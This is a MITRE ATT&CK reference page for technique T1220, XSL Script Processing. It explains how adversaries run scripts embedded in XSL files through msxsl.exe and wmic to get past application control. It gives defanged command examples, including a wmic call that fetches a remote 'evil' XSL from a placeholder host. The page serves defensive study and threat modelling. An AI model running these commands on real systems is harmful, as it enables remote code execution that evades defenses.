---
mitre_id: "T1220"
mitre_name: "XSL Script Processing"
mitre_type: "attack-pattern"
mitre_stix_id: "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3"
mitre_created: "2018-10-17T00:14:20.652Z"
mitre_modified: "2025-10-24T17:49:33.993Z"
mitre_version: "1.3"
mitre_domains:
  - "enterprise-attack"
mitre_url: "https://attack.mitre.org/techniques/T1220/"
build_date: "2026-04-23 20:16:46"
build_source: "script"
mitre_is_subtechnique: "False"
mitre_platforms:
  - "Windows"
mitre_tactic_ids:
  - "TA0005"
---

# T1220: XSL Script Processing

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [[T1127-trusted_developer_utilities_proxy_execution|T1127: Trusted Developer Utilities Proxy Execution]], the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* `msxsl.exe customers[.]xml script[.]xsl`
* `msxsl.exe script[.]xsl script[.]xsl`
* `msxsl.exe script[.]jpeg script[.]jpeg`

Another variation of this technique, dubbed “Squiblytwo”, involves using [[T1047-windows_management_instrumentation|T1047: Windows Management Instrumentation]] to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [[T1218-system_binary_proxy_execution#^t1218010-regsvr32|T1218.010: Regsvr32]]/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [[T1047-windows_management_instrumentation|T1047: Windows Management Instrumentation]] provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: `wmic process list /FORMAT:evil[.]xsl`
* Remote File: `wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”`

## Tactics

- [[TA0005-defense_evasion|TA0005: Defense Evasion]]

## Mitigations

- [[M1038-execution_prevention|M1038: Execution Prevention]]

## Platforms

- Windows

